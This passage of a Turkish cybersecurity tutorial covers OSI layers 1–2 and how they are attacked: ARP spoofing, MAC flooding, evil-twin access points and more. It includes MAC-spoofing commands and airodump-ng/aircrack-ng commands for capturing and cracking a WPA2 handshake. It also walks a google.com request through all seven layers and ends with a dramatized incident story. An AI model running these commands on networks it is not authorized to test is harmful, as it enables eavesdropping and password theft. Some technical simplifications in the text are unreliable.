3. Sen: "Teşekkürler!" (ARP cache'e kaydeder)

Artık paket gönderebilirsin:
Destination MAC: AA:BB:CC:DD:EE:FF
Destination IP: 8.8.8.8
```

**Switch vs Hub:**

**Hub (Eski, aptal):**
```
Paket geldi → Tüm portlara gönder!
→ Herkes herkesi duyuyor (güvensiz!)
```

**Switch (Modern, akıllı):**
```
MAC Address Table tutar:
Port 1 → AA:BB:CC:DD:EE:FF
Port 2 → 11:22:33:44:55:66

Paket geldi (Hedef: AA:BB...) → Sadece Port 1'e gönder!
→ Trafiği izole eder (güvenli!)
```

### 🎯 Hacker Buradan Nasıl Sızar?

#### 1. **ARP Spoofing (Man-in-the-Middle'ın Kalbi!)**

**Senaryo:** Aynı networkteyiz, trafiği dinleyeceğim

```
Normal durum:
Alice (192.168.1.100, MAC: AA:AA:AA)
Router (192.168.1.1, MAC: RR:RR:RR)

Alice: "192.168.1.1'in MAC'i ne?"
Router: "Benim MAC: RR:RR:RR"
Alice → Router: Trafik normal gidiyor

ARP Spoofing:
Hacker (192.168.1.50, MAC: HH:HH:HH):

1. Alice'e sahte ARP paketi:
   "192.168.1.1'in MAC'i HH:HH:HH" (yalan!)
   
2. Router'a sahte ARP paketi:
   "192.168.1.100'ün MAC'i HH:HH:HH" (yalan!)

Artık:
Alice → Hacker → Router
Router → Hacker → Alice

→ Tüm trafik Hacker'dan geçiyor! 🚨
```

**Gerçek hayat analojisi:**
```
Alice mektup gönderiyor.

Normal: Alice → Postane → Mehmet

ARP Spoofing:
Hacker postacıya: "Ben Mehmet'in yeni adresiyim"
Mehmet'e: "Ben Alice'in yeni adresiyim"

Artık:
Alice → Hacker → Mehmet
Mehmet → Hacker → Alice

→ Tüm mektuplaşmayı okuyor!
```

**Koruma:**
```
✓ Static ARP entries (manuel MAC-IP eşleştirme)
✓ ARP spoofing detection tools (arp-scan, XArp)
✓ Network segmentation (VLAN)
```

#### 2. **MAC Flooding**

**Senaryo:** Switch'i aptal Hub gibi çalıştırma

```
Switch'in MAC table kapasitesi: 1000 entry

Hacker:
1. 10,000 sahte MAC adresi üret
2. Hepsinden paket gönder
3. Switch'in tablosu doldu!
4. Switch: "Artık hatırlayamıyorum, herkese göndereyim!" (Hub modu)

→ Hacker tüm trafiği dinleyebilir! 🚨
```

**Koruma:**
```
✓ Port security (her porttan max MAC sayısı)
✓ MAC address limiting
```

#### 3. **VLAN Hopping**

**VLAN = Virtual LAN (Network bölümleme)**

```
Normal:
VLAN 10: Muhasebe (izole)
VLAN 20: IT (izole)
→ Birbirini göremez

VLAN Hopping:
Hacker: VLAN 10'da ama 802.1Q tag manipülasyonu yapıyor
→ VLAN 20'ye erişiyor! 🚨
```

#### 4. **MAC Spoofing**

```
Hacker: Kendi MAC adresini değiştiriyor

Normal MAC: HH:HH:HH:HH:HH:HH
Spoofed MAC: AA:AA:AA:AA:AA:AA (admin'in MAC'i)

Firewall: "AA:AA:AA MAC'ini tanıyorum, geç!"
→ Bypass! 🚨
```

**Linux'ta MAC değiştirme:**
```bash
ifconfig eth0 down
ifconfig eth0 hw ether AA:AA:AA:AA:AA:AA
ifconfig eth0 up
```

**HACKER'IN KAZANCI:**
- ✅ Tüm trafiği dinler (ARP Spoofing)
- ✅ Switch'i çökertir (MAC Flooding)
- ✅ Network segmentation bypass eder (VLAN Hopping)
- ✅ MAC filtreleme bypass eder (MAC Spoofing)

---

## ⚡ LAYER 1: PHYSICAL (Fiziksel Katman)

### 📱 Sivil Hayattaki Karşılığı

> **"Postacının bisiklete binip pedal çevirmesi"**

Tüm dijital veri sonunda **fiziksel bir şeye** dönüşür:
- Elektrik sinyali (kablo)
- Işık sinyali (fiber optik)
- Radyo dalgası (WiFi)

**Gerçek hayat örnekleri:**
- Ethernet kablosu → Elektrik sinyali
- Fiber optik → Işık sinyali
- WiFi → Radyo dalgası
- Bluetooth → Radyo dalgası

### 🔧 Teknik Tanımı

**Bit = 0 veya 1**

Fiziksel olarak:
```
Kablo:
0 = 0 Volt
1 = 5 Volt

Fiber Optik:
0 = Işık yok
1 = Lazer ışığı var

WiFi:
0 = Düşük frekans
1 = Yüksek frekans
```

**Encoding (Kodlama):**

```
Binary data: 01101001

Manchester Encoding:
0 → Yüksek-Düşük geçiş
1 → Düşük-Yüksek geçiş

Kabloda:
 _   __   _   _   __   _   __   _
| |_|  |_| |_| |_|  |_| |_|  |_| |
0   1  1    0   1  0    0   1

→ Alıcı bu dalgaları decode ediyor
```

**İletim Ortamları:**

| Tip | Hız | Mesafe | Maliyet | Güvenlik |
|-----|-----|--------|---------|----------|
| **Cat5e (Ethernet)** | 1 Gbps | 100m | Düşük | Düşük (dinlenebilir) |
| **Cat6/6a** | 10 Gbps | 100m | Orta | Düşük |
| **Fiber Optik** | 100+ Gbps | 40km+ | Yüksek | Yüksek (dinlenemez) |
| **WiFi (2.4GHz)** | 300 Mbps | 50m | Düşük | Çok düşük (havada) |
| **WiFi (5GHz)** | 1 Gbps | 30m | Düşük | Çok düşük |

**Collision Detection (Çarpışma Tespiti):**

```
Hub ile bağlı 3 bilgisayar:

A, B, C aynı anda veri gönderirse:
→ Sinyaller çarpışır (collision)
→ Veri bozulur!

CSMA/CD (Carrier Sense Multiple Access/Collision Detection):

1. Gönder

meden önce dinle (kanalda trafik var mı?)
2. Boşsa gönder
3. Çarpışma olduysa:
   - Rastgele süre bekle
   - Tekrar dene
```

### 🎯 Hacker Buradan Nasıl Sızar?

#### 1. **Wire Tapping (Kablo Dinleme)**

```
Ethernet kablosunu fiziksel olarak kesip ortasına cihaz koyma:

Alice ←──┬──→ Router
         │
      Hacker
      (Tap device)

→ Tüm elektrik sinyallerini kopyalıyor! 🚨
```

**Gerçek hayat analojisi:**
```
Telefon hattına böcek koyma (wiretapping)
→ Konuşmaları dinleme
```

#### 2. **WiFi Sniffing (Radyo Dinleme)**

```
WiFi = Radyo dalgası = Hava ile yayılır

Hacker:
1. WiFi kartını "monitor mode" açar
2. Tüm paketleri yakalar (Wireshark/Airodump)
3. WEP/WPA şifreliyse kırmaya çalışır

Araç: Aircrack-ng
```

**WPA2 Handshake yakalama:**
```bash
airodump-ng wlan0  # Ağları tara
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0  # Hedef ağı dinle

Birisi bağlanınca:
→ 4-way handshake yakalanır
→ Offline dictionary attack ile şifre kırılır

aircrack-ng -w wordlist.txt capture.cap
```

#### 3. **Evil Twin (Sahte Access Point)**

```
Gerçek WiFi: "Starbucks_WiFi" (WPA2 şifreli)

Hacker:
1. "Starbucks_WiFi" adında sahte AP kuruyor (şifresiz!)
2. Daha güçlü sinyal veriyor
3. Kurbanlar sahte AP'ye bağlanıyor
4. Hacker tüm trafiği görebiliyor! 🚨
```

**Gerçek hayat analojisi:**
```
Gerçek postane: "PTT Ankara Postanesi"

Hacker: Yan binaya "PTT Ankara Postanesi" tabelası asıyor
İnsanlar: Sahte postaneye mektup veriyor
→ Hacker tüm mektupları okuyor!
```

#### 4. **Jamming (Sinyal Bozma)**

```
WiFi frekansına gürültü gönder:
→ Kimse bağlanamaz!

Araç: WiFi jammer (yasadışı!)
```

#### 5. **Kablo Kesme (Physical DoS)**

```
En basit saldırı:
→ Sunucunun kablosunu kes!
→ İnternet kesildi! 🚨

Fiziksel güvenlik önemli!
```

**HACKER'IN KAZANCI:**
- ✅ Tüm trafiği fiziksel olarak dinler
- ✅ Şifresiz WiFi trafiğini okur
- ✅ Sahte AP ile MitM yapar
- ✅ Sinyal bozar (Jamming)
- ✅ Fiziksel erişimle her şeyi kontrol eder

---

# 🌐 PRATİK SENARYO: google.com YOLCULUĞU

Bir kullanıcı tarayıcıya **`google.com`** yazıp Enter'a basıyor. İşte paketin **atomik seviye** yolculuğu:

## 📍 Başlangıç

```
Kullanıcı: "google.com" yazar + Enter
```

---

### ⚡ LAYER 7: APPLICATION

```
Tarayıcı:
"Kullanıcı ne istiyor? → Web sayfası
 Hangi protokol? → HTTP/HTTPS
 Ne göndereceğim? → HTTP GET isteği"

Oluşturulan istek:
GET / HTTP/1.1
Host: google.com
User-Agent: Mozilla/5.0
Accept: text/html
```

**Kontrol noktası:** İstek oluşturuldu ✓

---

### 🎨 LAYER 6: PRESENTATION

```
Tarayıcı:
"HTTP mi HTTPS mi? → HTTPS (443 port)
 Şifrelemeli miyim? → Evet, TLS 1.3"

TLS Handshake:
1. ClientHello → Google'a bağlan
2. ServerHello → Sertifika al
3. Key exchange → Şifreleme anahtarı oluştur

HTTP isteği şifreleniyor:
"GET / HTTP/1.1..." → "x8#mK$2pQ..." (AES-256)
```

**Kontrol noktası:** Veri şifrelendi ✓

---

### 🤝 LAYER 5: SESSION

```
Tarayıcı:
"Yeni bir oturum mu? → Evet
 Session ID oluştur → sess_abc123"

Session yönetimi:
- Connection: keep-alive (bağlantıyı aç tut)
- Timeout: 30 dakika
```

**Kontrol noktası:** Oturum kuruldu ✓

---

### 📦 LAYER 4: TRANSPORT

```
İşletim Sistemi:
"Hedef port: 443 (HTTPS)
 Kaynak port: 54321 (rastgele)
 Protokol: TCP"

TCP 3-Way Handshake:
Bilgisayarın → Google: SYN (Seq=1000)
Google → Bilgisayarın: SYN-ACK (Seq=5000, Ack=1001)
Bilgisayarın → Google: ACK (Seq=1001, Ack=5001)

→ Bağlantı kuruldu!

Şifreli HTTP isteği TCP segment'e konuyor:
┌─────────────────────────┐
│ Source Port: 54321      │
│ Dest Port: 443          │
│ Sequence: 1001          │
│ DATA: [şifreli HTTP]    │
└─────────────────────────┘
```

**Kontrol noktası:** TCP segment oluşturuldu ✓

---

### 🗺️ LAYER 3: NETWORK

```
İşletim Sistemi:
"Google'ın IP'si ne? → DNS sorgusu gerekiyor"

DNS Sorgusu (Layer 7 yeni istek!):
Bilgisayar → DNS (8.8.8.8): "google.com'un IP'si ne?"
DNS → Bilgisayar: "142.250.185.46"

IP Paketi oluşturuluyor:
┌──────────────────────────┐
│ Source IP: 192.168.1.100 │ (sen)
│ Dest IP: 142.250.185.46  │ (Google)
│ Protocol: TCP (6)        │
│ TTL: 64                  │
│ DATA: [TCP segment]      │
└──────────────────────────┘

Routing:
"142.250.185.46 farklı networktte
 → Gateway'e gönder: 192.168.1.1"
```

**Kontrol noktası:** IP paketi oluşturuldu, hedef belirlendi ✓

---

### 🔗 LAYER 2: DATA LINK

```
Network kartı:
"Gateway'in MAC adresi ne?"

ARP sorgusu:
Broadcast: "192.168.1.1'in MAC'i nedir?"
Router: "Benim MAC: AA:BB:CC:DD:EE:FF"

Ethernet Frame oluşturuluyor:
┌───────────────────────────────┐
│ Dest MAC: AA:BB:CC:DD:EE:FF  │ (Router)
│ Source MAC: 11:22:33:44:55:66│ (sen)
│ EtherType: 0x0800 (IPv4)     │
│ DATA: [IP paketi]            │
│ CRC: 0x4A3F2B1C              │
└───────────────────────────────┘
```

**Kontrol noktası:** Ethernet frame hazır ✓

---

### ⚡ LAYER 1: PHYSICAL

```
Network kartı (NIC):
"Frame'i elektrik sinyaline çevir!"

Binary → Elektrik:
Frame: 01101000 01100101...

Kabloda:
 _   __   _   _   __   _   __   _
| |_|  |_| |_| |_|  |_| |_|  |_| |
→ Router'a fiziksel olarak iletiyor

→ Kablo: Cat6, 1 Gbps hız
```

**Kontrol noktası:** Elektrik sinyali kabloda! ✓

---

## 🚀 Yolculuk: Senin Bilgisayarından Google'a

```
[Senin PC] →(Ethernet kablo)→ [Router/Modem]
                                    ↓
                              [ISP Router 1]
                                    ↓
                              [ISP Router 2]
                                    ↓
                            [Backbone Router]
                                    ↓
                             [Google Router]
                                    ↓
                           [Google Sunucusu]

Her router'da:
- Layer 1: Elektrik sinyali → Bit
- Layer 2: Frame aç, MAC kontrol et
- Layer 3: IP paketi aç, routing yap
- Layer 2: Yeni frame oluştur (yeni MAC)
- Layer 1: Yeni elektrik sinyali
```

---

## 📥 Google Sunucusunda Açılım (Decapsulation)

```
[Google Sunucusu]

Layer 1: Elektrik sinyali → Bit'lere çevir
         ↓
Layer 2: Ethernet frame aç
         - MAC kontrol et: "Bana geldi mi?" ✓
         - Frame'i at, IP paketini çıkar
         ↓
Layer 3: IP paketi aç
         - Destination IP kontrol: "142.250.185.46 benim!" ✓
         - Paketi at, TCP segment'i çıkar
         ↓
Layer 4: TCP segment aç
         - Port kontrol: "443 (HTTPS) → Web sunucu"
         - Sequence numarası kontrol
         - ACK gönder: "Paket alındı!"
         - Segment'i at, şifreli veriyi çıkar
         ↓
Layer 6: TLS decryption
         - Şifreli veriyi çöz
         - "x8#mK$2pQ..." → "GET / HTTP/1.1..."
         ↓
Layer 5: Session yönetimi
         - Session ID kontrol
         - "Yeni session, oluştur"
         ↓
Layer 7: HTTP isteği işle
         - "GET / HTTP/1.1" → Ana sayfa isteniyor
         - HTML dosyasını oluştur
         - Yanıt hazırla:
         
         HTTP/1.1 200 OK
         Content-Type: text/html
         
         <html>
           <body>
             <img src="google_logo.png">
             <input type="search">
           </body>
         </html>
```

---

## 📤 Google'dan Sana Dönüş (Response)

Aynı katmanlar **TERS SIRADA** tekrar çalışır:

```
Layer 7: HTTP Response oluştur
         ↓
Layer 6: TLS ile şifrele
         ↓
Layer 5: Session sürdür
         ↓
Layer 4: TCP segment'e koy (ACK, Seq numaraları)
         ↓
Layer 3: IP paketi (Dest: 192.168.1.100, Source: 142.250.185.46)
         ↓
Layer 2: Ethernet frame (Dest MAC: senin MAC'in)
         ↓
Layer 1: Elektrik sinyali → İnternet üzerinden geri geliyor
```

---

## 🖥️ Senin Tarayıcında Açılım

```
Layer 1: Elektrik sinyali → Bit
         ↓
Layer 2: Frame aç → IP paketi çıkar
         ↓
Layer 3: IP paketi aç → TCP segment çıkar
         ↓
Layer 4: TCP segment aç → ACK gönder, şifreli veri çıkar
         ↓
Layer 6: TLS decrypt → HTTP response çıkar
         ↓
Layer 5: Session devam ediyor
         ↓
Layer 7: HTTP/1.1 200 OK
         <html>...</html>

Tarayıcı:
- HTML'i parse et
- CSS yükle
- JavaScript çalıştır
- Ekrana render et

→ Google ana sayfası görünüyor! 🎉
```

---

# 🧠 NEDEN ALT KATMANLAR OLMADAN ÜST KATMANLARDA UZMAN OLUNAMAZ?

## 🔍 Kanıt 1: Hata Ayıklama (Debugging)

**Senaryo:** Web sitesi yüklenmiyor!

**Layer 7 uzmanı (alt katmanları bilmiyor):**
```
"HTTP 500 hatası var, sunucu problemi!"
→ Ama gerçek problem Layer 3'te (routing)
→ Çözemedi! ❌
```

**Tam donanımlı güvenlikçi:**
```
1. Layer 7: HTTP 500 → Sunucu cevap veriyor ama hata var
2. Layer 4: TCP bağlantısı var mı? → Wireshark: SYN-ACK geliyor ✓
3. Layer 3: Routing doğru mu? → Traceroute: 5. hopda timeout!
4. Layer 2: MAC tablo kirliliği mi? → Switch logları: MAC flooding!

→ ARP Spoofing saldırısı tespit edildi! ✓
```

---

## 🔍 Kanıt 2: Saldırı Tespiti

**Senaryo:** DDoS saldırısı!

**Layer 7 uzmanı:**
```
"HTTP istekleri çok fazla, rate limiting koy!"
→ Ama saldırı Layer 4'te (SYN Flood)
→ Rate limiting işe yaramadı! ❌
```

**Tam donanımlı güvenlikçi:**
```
1. Layer 7: HTTP istekleri normal
2. Layer 4: Çok fazla SYN paketi, ACK yok → SYN Flood!
3. Layer 3: Sahte IP'lerden geliyor → IP Spoofing

Çözüm:
- SYN Cookies aktif et
- Firewall kuralı: SYN rate limit
- Cloud DDoS protection
→ Saldırı önlendi! ✓
```

---

## 🔍 Kanıt 3: Performans Optimizasyonu

**Senaryo:** Video streaming yavaş!

**Layer 7 uzmanı:**
```
"Video codec'i değiştir, H.265 kullan!"
→ Codec değişti ama hala yavaş ❌
```

**Tam donanımlı güvenlikçi:**
```
1. Layer 7: Video codec tamam
2. Layer 6: Encryption overhead çok mu? → TLS 1.3 hızlı ✓
3. Layer 5: Session timeout çok kısa → Sürekli reconnect!
4. Layer 4: TCP mi UDP mi? → TCP kullanılmış!
   → Video streaming için UDP olmalı!
5. Layer 3: Routing optimal mi? → BGP path'i uzun!
6. Layer 2: Switch bottleneck? → 100 Mbps port, 1 Gbps olmalı!
7. Layer 1: Kablo Cat5 → Cat6 gerekli!

→ Tüm katmanlarda optimizasyon ✓
```

---

## 🔍 Kanıt 4: Güvenlik Açığı Tespit

**Senaryo:** Bir zafiyet raporu geldi

**Layer 7 uzmanı:**
```
"SQL Injection var, parametreyi sanitize et!"
→ Ama saldırgan Layer 3'ten IP spoofing yapıyor
→ Gerçek IP'si tespit edilemedi! ❌
```

**Tam donanımlı güvenlikçi:**
```
1. Layer 7: SQL Injection → Input validation ekle ✓
2. Layer 4: Hangi porttan geliyor? → 443 (HTTPS)
3. Layer 3: IP 10.0.0.50 → Ama TTL değeri tutarsız!
   → IP Spoofing yapılmış!
   → Gerçek IP: X-Forwarded-For header'ında
4. Layer 2: MAC adresi → Switch log'larında farklı MAC!
   → ARP Spoofing de var!

→ Saldırganın gerçek konumu tespit edildi! ✓
```

---

## 🎯 Sonuç: Katmanlar Hiyerarşisi

```
┌────────────────────────────────────────┐
│ Layer 7: Ne? (SQL Injection)           │
├────────────────────────────────────────┤
│ Layer 6: Nasıl? (Şifreli mi?)          │
├────────────────────────────────────────┤
│ Layer 5: Ne zaman? (Session timing)    │
├────────────────────────────────────────┤
│ Layer 4: Hangi kapıdan? (Port)         │
├────────────────────────────────────────┤
│ Layer 3: Nereden nereye? (IP)          │
├────────────────────────────────────────┤
│ Layer 2: Hangi cihazdan? (MAC)         │
├────────────────────────────────────────┤
│ Layer 1: Fiziksel olarak nasıl? (Kablo)│
└────────────────────────────────────────┘

Her katman bir sonrakinin TEMELİDİR!

Layer 7 çalışması için:
→ Layer 6 çalışmalı (şifreleme)
→ Layer 5 çalışmalı (session)
→ Layer 4 çalışmalı (TCP bağlantısı)
→ Layer 3 çalışmalı (IP routing)
→ Layer 2 çalışmalı (MAC iletişimi)
→ Layer 1 çalışmalı (fiziksel bağlantı)

Bir tanesi yoksa:
→ Üstteki katmanlar ÇALIŞMAZ!
```

---

## 🏆 BÜYÜK FİNAL: Gerçek Dünya Senaryosu

**Bir şirkete siber güvenlik danışmanı olarak girdin. İlk gün:**

```
CEO: "Web sitemiz hacklenmiş, nasıl oldu?"

Layer 7-only uzman:
"Muhtemelen SQL Injection veya XSS!"
→ Ama gerçek neden Layer 2 ARP Spoofing
→ Problemi çözemedi, işten çıkarıldı!

Full-stack güvenlikçi (sen):

1. Layer 7 analizi:
   - HTTP log'ları: Normal, SQL Injection yok
   - XSS denenmiş ama WAF engellemiş

2. Layer 6 analizi:
   - TLS sertifikası geçerli
   - Ama son 2 günde 100 farklı sertifika kullanılmış!
   → SSL Strip attack şüphesi

3. Layer 5 analizi:
   - Admin session'ları anormal saatlerde
   - Session ID'ler çalınmış olabilir

4. Layer 4 analizi:
   - Port 22 (SSH) dışarıya açık!
   - Brute-force logları var

5. Layer 3 analizi:
   - İç networkten gelen istekler var
   - Ama o IP range kullanımda değil!
   → IP Spoofing

6. Layer 2 analizi:
   - Switch log'ları: MAC flooding tespit edildi!
   - ARP cache kirliliği var
   → ARP Spoofing yapılmış!

7. Layer 1 analizi:
   - Fiziksel erişim log'ları: Bilinmeyen cihaz bağlanmış
   → Raspberry Pi ile fiziksel Man-in-the-Middle!

SONUÇ:
Saldırgan:
1. Fiziksel olarak binaya girdi (Layer 1)
2. Network'e cihaz taktı
3. ARP Spoofing yaptı (Layer 2)
4. IP Spoofing ile iç network gibi göründü (Layer 3)
5. Admin session'larını hijack etti (Layer 5)
6. SSL Strip ile şifreyi çaldı (Layer 6)
7. Web paneline girdi (Layer 7)

→ 7 katmanda da iz bıraktı!
→ Sadece Layer 7'ye bakanlar fark etmedi!
→ Sen tüm katmanları kontrol edip yakaladın!

CEO: "Muhteşem! İşe alındın!" 🎉
```

---

# 🎓 SON SÖZ

OSI Modeli sadece bir **teori** değil, **gerçek dünyanın mimarisidir**.

Her katman:
- ✅ Kendi sorumluluğu var
- ✅ Kendi saldırı vektörleri var
- ✅ Kendi savunma mekanizmaları var

**Bir siber güvenlik uzmanı:**
- Sadece kod okumaz (Layer 7)
- Sadece firewall kurmaz (Layer 3-4)
- Sadece kablo takıp çıkarmaz (Layer 1)

**HEPSİNİ BİLİR!**

Çünkü:
```
Hacker her katmanda saldırabilir.
Sen her katmanda savunmalısın.

Zincirin en zayıf halkası kopar.
Sen tüm halkaları güçlendirmelisin.
```

---

**Şimdi git ve 7 katmanın da ustası ol!** 🚀

**#OSIModel #CyberSecurity #NetworkSecurity #HackerMindset**

---

*"Bilgi güçtür, ama anlayış onu silaha çevirir."*
